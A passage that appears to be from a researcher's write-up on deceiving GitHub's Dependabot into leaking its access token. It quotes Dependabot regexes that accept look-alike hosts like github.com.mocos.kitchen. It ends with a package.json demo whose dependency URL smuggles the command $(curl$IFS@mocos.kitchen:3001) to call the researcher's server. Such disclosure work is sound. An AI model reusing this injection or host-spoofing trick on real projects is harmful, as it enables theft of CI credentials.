credentials =
  [{
    "type" => "git_source",
    "host" => "github.com",
    "username" => "x-access-token",
    "password" => "a-github-access-token"
  }]
This Gist brought to you by gist-it.view rawupdate-script.rb
My first idea is to deceiving a Dependabot so that the bot will sends the token to my server instead of GitHub. This idea seems possible because there are flaws in URL validations.

One of the validations is to check whether the URL contains github.com or not. Obviously, this validation accepts a URL such as github.com.mocos.kitchen.

    KNOWN_HOSTS = /github\.com|bitbucket\.org|gitlab.com/i.freeze
This Gist brought to you by gist-it.view rawcommon/lib/dependabot/git_metadata_fetcher.rb
      raise Dependabot::GitDependenciesNotReachable, [uri] unless uri.match?(KNOWN_HOSTS)
This Gist brought to you by gist-it.view rawcommon/lib/dependabot/git_metadata_fetcher.rb
Another one uses following regexp which accepts a URL such as git+https://github.com.mocos.kitchen/username/repo.

      GIT_URL_REGEX = %r{
        (?<git_prefix>^|^git.*?|^github:|^bitbucket:|^gitlab:|github\.com/)
        (?<username>[a-z0-9-]+)/
        (?<repo>[a-z0-9_.-]+)
        (
          (?:\#semver:(?<semver>.+))|
          (?:\#(?=[\^~=<>*])(?<semver>.+))|
          (?:\#(?<ref>.+))
        )?$
      }ix.freeze
This Gist brought to you by gist-it.view rawnpm_and_yarn/lib/dependabot/npm_and_yarn/file_parser.rb
Based on these tricks, Dependabot treats git+https://github.com.mocos.kitchen/username/repo as a valid GitHub’s URL.
First dive into a Dependabot server
Next, in order to try this attack in GitHub environment, I enabled Dependabot alerts in the sample repository. We can do this by simply creating a .github/dependabot.yml file.

---
version: 
updates:
  - package-ecosystem: npm
    directory: "/"
    schedule:
      interval: daily
Token stealing demo

{
  "name": "javascript",
  "version": "1.0.0",
  "main": "index.js",
  "license": "MIT",
  "private": true,
  "dependencies": {
    "tyage-sample-package": "https://github.com/tyage/;$(curl$IFS@mocos.kitchen:3001);?/github.com/tyage/sample-package.git#semver:4.0.0"
  }
}
